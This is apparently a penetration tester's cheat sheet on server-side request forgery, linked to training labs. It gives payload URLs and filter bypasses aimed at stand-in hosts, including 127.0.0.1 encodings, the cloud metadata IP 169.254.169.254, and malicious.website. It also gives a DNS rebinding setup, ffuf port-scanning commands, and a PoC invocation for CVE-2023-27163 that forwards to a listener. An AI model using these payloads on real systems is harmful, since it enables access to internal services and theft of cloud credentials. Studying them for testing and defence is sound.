# Server-Side Request Forgery (SSRF)

<div class="row row-cols-lg-2"><div>

#### Common SSRF

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)
[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)
[![surfer](../../../../_badges/thm-p/surfer.svg)](https://tryhackme.com/r/room/surfer)

The most common example of a SSRF is to access a remote server. This may expose internal headers, be exploited for a DoS, or further exploited to map and access internal services.

```text!
GET /?download=https://<burp suite collaborator domain>
```

#### SSRF With Redirection

[![modern_web_exploitation_techniques](../../../../_badges/htb/modern_web_exploitation_techniques.svg)](https://academy.hackthebox.com/course/preview/modern-web-exploitation-techniques)

While mainly used to bypass filters, we can use HTML or PHP redirections. Python "requests" doesn't follow redirections by default.

```html!
<!-- input: /?download=https://example.com, returns 127.0.0.1 -->
<?php header('Location: http://127.0.0.1/'); ?>
```

#### DNS Rebinding

[![modern_web_exploitation_techniques](../../../../_badges/htb/modern_web_exploitation_techniques.svg)](https://academy.hackthebox.com/course/preview/modern-web-exploitation-techniques)

While mainly used to bypass filters, we can rebind a domain to point to another domain or IP dynamically <small>(we abuse of a low TTL)</small>. 

* [rebinder](https://lock.cmpxchg8b.com/rebinder.html) <small>(website, TTL=10)</small>
* [DNSrebinder](https://github.com/mogwailabs/DNSrebinder) <small>(0.1k ‚≠ê)</small>
* [FakeDns](https://github.com/Crypt0s/FakeDns) <small>(0.6k ‚≠ê, TTL>=0)</small>
* [singularity](https://github.com/nccgroup/singularity) <small>(1.1k ‚≠ê, web client and GOLang server)</small>.
* ``s-1.1.1.1-127.0.0.1-<unique_seed>-fs-e.d.rebind.it``

<details class="details-n">
<summary>Example Scenario</summary>

A webserver makes two SSRF calls, the first to check if resource is valid, the second to process the resource. 

We will create a domain called `rebinding.example.com` record pointing to a DNS server that we own `ns1337.example.com YOUR_SERVER_IP` on which the script will run.

```
rebinding IN NS ns1337.example.com.
ns1337 IN A YOUR_SERVER_IP
```

Disable any service using port 53. Install [FakeDns](https://github.com/Crypt0s/FakeDns).

```shell!
$ DEST="$HOME/tools/fakedns"
$ git clone -b "master" https://github.com/Crypt0s/FakeDns.git $DEST
$ ln -s $DEST/fakedns.py $HOME/.local/bin/fakedns
```

For our use case, to rotate the IP between every request:

```shell!
$ cat test.conf
A rebinding.example.com 1.1.1.1,127.0.0.1
# alternative: A rebinding.example.com 1.1.1.1 0%127.0.0.1
$ fakedns -c test.conf --rebind # Run The DNS Server
```

* Input: `http://rebinding.example.com/admin`
</details>

</div><div>

#### Exploit other protocols üí∞

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)
[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)

A few protocols aside from HTTPS may yield results.

* `ftp://` to connect to a FTP server
* `file://some/file/on/the/target` when supported ([files](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/arbitrary_file_access.md))

<br>

#### Access Internal Services üó∫Ô∏è

[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)
[![surfer](../../../../_badges/thm-p/surfer.svg)](https://tryhackme.com/r/room/surfer)

You may be able to query internal IPs or internal websites. Aside from localhost, make sure to test interesting IPs in cloud environments.

<br>

#### Mapping ports/services üó∫Ô∏è

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)
[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)

You may inject URLs such as `http://localhost:22` to test if the port `22` is open. You can use fuzzing to enumerate all ports:

```ps
$ seq 1 65535 > ports.txt
$ ffuf -w ports.txt -u 'http://IP/?xxx=http://127.0.0.1:FUZZ' -fr 'Connection refused'
```

You could also make the server call `http://ifconfig.pro/` to get some information <small>(IP, DNS...)</small> to perform more advanced attacks.
</div></div>

<hr class="sep-both">

## SSRF Filter Bypass

<div class="row row-cols-lg-2"><div>

#### SSRF Filter Bypass ‚Äî Starting with

A filtering "starting with" without a trailing slash can be bypassed:

* `https://example.com.malicious.website`
* `https://example.com@malicious.website`
* `https://example.com#malicious.website`
* `https://example.com?malicious.website`
* `https://example.com/&malicious.website`
* `https://example.com/;malicious.website`

üõ°Ô∏è Add a trailing slash to any starting with rule.
</div><div>

#### SSRF Filter Bypass ‚Äî IP Filtering

[![modern_web_exploitation_techniques](../../../../_badges/htb/modern_web_exploitation_techniques.svg)](https://academy.hackthebox.com/course/preview/modern-web-exploitation-techniques)
[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)
[![ssrfhr](../../../../_badges/thm/ssrfhr.svg)](https://tryhackme.com/r/room/ssrfhr)

There are multiple representations of `127.0.0.1` or `169.254.169.254`.

*  `0`, `00`, `000[...]0`, `0.0.0.0` (any IP, which may be localhost)
* `2130706433` (decimal), `017700000001` (octal), `0x7f000001` (hex)
* `127.1` (IP shortening), `127.00[...]00.1` (IP prolonging)
* `::1`, `::ffff:127.0.0.1` (IPV6)

Common domains for convenience: [127.0.0.1.nip.io](http://127.0.0.1.nip.io), [localtest.me](http://localtest.me), [lvh.me](http://lvh.me), [firefox.fr](http://firefox.fr/).

For all IPs, use: [rebinder](https://lock.cmpxchg8b.com/rebinder.html) with two times the same IP.
</div></div>

<hr class="sep-both">

## Example CVEs

<div class="row row-cols-lg-2"><div>

#### CVE-2023-27163

[![sau](../../../../_badges/htb-p/sau.svg)](https://app.hackthebox.com/machines/Sau)

CVE in [request-baskets](https://github.com/darklynx/request-baskets). [POC (shell script)](https://github.com/entr0pie/CVE-2023-27163) <small>(0.03k ‚≠ê)</small>.

```shell!
$ ./CVE-2023-27163.sh http://target:port http://listener:port 
Creating the "<backet>" proxy basket...
Basket created!
$ curl http://target:port/<backet> # sent to listener URL
```

It can be used to access a resource behind a firewall.

```ps
$ ./CVE-2023-27163.sh http://target:port http://target:fport 
```
</div><div>

#### The GOAT Way üêê

In Python, the `requests` module uses a old version of URLLIB. The following URL `"https://example.com\@@127.0.0.1/../flag"` is interpreted differently between `requests` and `urllib` ([src](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)):

* `host=127.0.0.1\@@example.com path=/../flag` with URLLIB3+
* `host=127.0.0.1 path=/@@example.com/../flag` with URLLIB3

With this trick, you can bypass this dummy code:

```py
URL = "https://127.0.0.1\@@example.com/../flag"
hostname = urllib.parse.urlparse(URL)
# Will verify 127.0.0.1\@@example.com
if hardened_check_on_hostname(hostname):
    raise Exception()
# Will fetch 127.0.0.1/flag
print(requests.get(URL).text)
```

üìö This code is still vulnerable to DNS rebinding.
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

```py
ip = socket.gethostbyname("example.com") # extracted from input
ip = ipaddress.ip_address(ip)
if ip in ipaddress.ip_network('127.0.0.0/8'): # check others!!!
    return False
if ipaddress.ip_address(ip).is_loopback:
    return False # only check if 127.0.0.1
```
</div><div>
</div></div>